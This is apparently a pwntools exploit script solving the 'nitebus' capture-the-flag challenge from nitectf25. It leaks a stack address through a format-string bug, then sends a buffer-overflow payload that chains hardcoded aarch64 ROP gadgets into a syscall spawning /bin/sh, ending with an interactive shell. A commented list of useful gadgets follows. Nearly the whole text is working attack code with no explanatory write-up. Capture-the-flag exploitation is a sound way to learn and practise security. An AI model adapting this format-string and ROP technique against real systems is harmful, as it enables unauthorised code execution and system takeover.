from pwn import *

exe = ELF("../challenge/public/nitebus")
context.arch = "aarch64"

HOST = "nitebus.chals.nitectf25.live"
PORT = 1337


def conn():
    if args.LOCAL:
        r = process(["qemu-aarch64", exe.path])
    else:
        r = remote(HOST, PORT, ssl=True)
    return r


r = conn()


def packet(fid, code, lenn, data):
    pl = b""
    pl += p8(fid)
    pl += p8(code)
    pl += p16(lenn)
    pl += data
    return pl


def bof(pl):
    pll = packet(1, 0x42, 1000, b"a" * 20)
    r.sendafter(b"packet...", pll)
    r.sendafter(b"data:", pl)


def fmt(pl):
    pll = packet(1, 8, 1000, pl)
    r.sendafter(b"packet...", pll)


fmt(b"%3$p")

r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()

stack = int(r.recvline().split()[-1], 16)

buf = stack + 0x150

log.info(f"stack @ {hex(stack)}")

binsh = 0x490040

pl = b""
pl += b"a" * (0x98 - len(pl)) + p64(0x4063C4)
pl += b"a" * (0xC0 - len(pl)) + p64(buf + 0x110) + p64(0x445238)  # set x0
pl += (
    b"a" * (0xD8 - len(pl)) + p64(binsh + 0x10) + p64(0xDD)
)  # 138^0x1 = 0x8b sysreturn
pl += (
    b"a" * (0x100 - len(pl)) + p64(buf + 0x110) + p64(0x40CE28) + p64(binsh)
)  # loads /bin/sh string into x0 and calls [ldp x1,x2 svc]
pl + b"a" * (0x120 - len(pl)) + p64(0) + p64(0)  # load x1,x2 as 0

bof(pl)

r.interactive()


### Potentially Useful Gadgets:

# 0x00000000004063c4 : ldp x6, x8, [sp, #0x18] ; str x0, [x6, #0x20] ; ldp x29, x30, [sp], #0x40 ; mov x0, x8 ; ret
# 0x000000000040cb90 : svc #0 ; ret
# 0x0000000000401578 : svc #0 ; ldp x29, x30, [sp], #0x20 ; ret
# 0x0000000000445238 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
# 0x0000000000418248 : mov sp, x29 ; eor w0, w0, #1 ; ldp x29, x30, [sp], #0x10 ; ret
# 0x000000000043ff58 : ldp x0, x1, [sp, #0x40] ; ldp x2, x3, [sp, #0x30] ; ldp x4, x5, [sp, #0x20] ; ldp x6, x7, [sp, #0x10] ;       ldp x8, x9, [sp], #0xd0 ; ldp x17, x30, [sp], #0x10 ; br x16 ; nop ; ldr x0, [x0, #8] ; ret
# 0x000000000040ce28 : ldp x1, x2, [sp, #0x10] ; svc #0 ; cmn w0, #1, lsl #12 ; cs      neg w0, wzr, w0, ls ; ldp x29, x30, [sp], #0x20 ; ret
